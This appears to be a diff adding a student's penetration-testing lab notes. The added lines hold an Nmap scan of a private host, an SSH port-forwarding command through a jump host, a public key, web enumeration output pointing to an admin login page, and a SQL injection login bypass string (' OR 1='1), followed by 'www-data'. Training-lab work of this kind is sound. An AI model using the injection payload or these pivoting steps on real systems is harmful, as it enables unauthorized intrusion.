@@ -90,6 +90,41 @@ houseBeatFliesLOW
 YourTempPassword
 Welcome, archive user %U@%R !
 
+-------------------------------------------------------------------------------------------------------------------------------------
+Nmap scan report for 192.168.28.100
+Host is up (0.0013s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+student@lin-ops:~$ ssh -S /tmp/jump jump -O forward -L1234:192.168.28.100:2222
+
+SHA256:1IJ2BaabRIuyOrPWc3WNNIEeL8vJUfG3kRllvyE+4Fs student@lin-ops
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC4t96nLhyulDUlYaHq61rEyqV7kByxXO9I8x24F55hgOzXjTavtsG903mnYZEApVjNb2L1hgt1KXVmEafOF0sJPUxllED+rxlijPN2RbV1LhyVGsjbK3WDnbwVCcHlsZc2e/pLinCoJ5irz+dHZDvRJCwF1vU0S0d9kcRmjVU73kDQbXrdbeWLLGzm9XzwpS2F8e9CoX6rZiqF3Bh68dzWJwBxwiqWdsqmYC2KYu2y61wpHqA15YH2vzFDn4DE/GWR23VZwDF5zaCALYNbKQ8Oeic7u6eauP6o1CR9v31iNMIQCLJKZxtQ77kM3bNDwQJFQeYiRB9MnYe6sbSUL68IT5keeJHVflVaoEOoMvgj7ZlxooJOch5meoo+NiGJ6YhNoAYL/OHswcg3ygLanwgkfNUJAmUbHfyGNKKGbA9shUv+DASRiAlxrpXySrLvaH6XU3bESnr44ty8libv8CdsmvysjURMvfuiK+Wop7BeeiPnGT2KW9Ekvc2WpTPqlBxOR2ZcelYFdHqbqpUjeic4GqABJNUSAITCOhT5n7e1/d0FlwWtDm3Gr6x7r0wK4RPeGTU3hmsdmpzna1aAowKjqfqp+VDmUFUsByhj2Uejx3Sy03BLcKbf8yvy4diyvltiPWqZpRudMj/x+RMeMi3U6xnakPQ/BC0WEMnD1GMZfw== student@lin-ops
+
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/login.php: Possible admin folder
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+tom ' OR 1='1
+
+www-data
+
+192.168.150.253 Donovian-Intranet
+192.168.28.100:2222     10.10.28.40:59660       ESTABLISHED
+
+
+
+
+
+
+
+
+
+
+
 
 
 
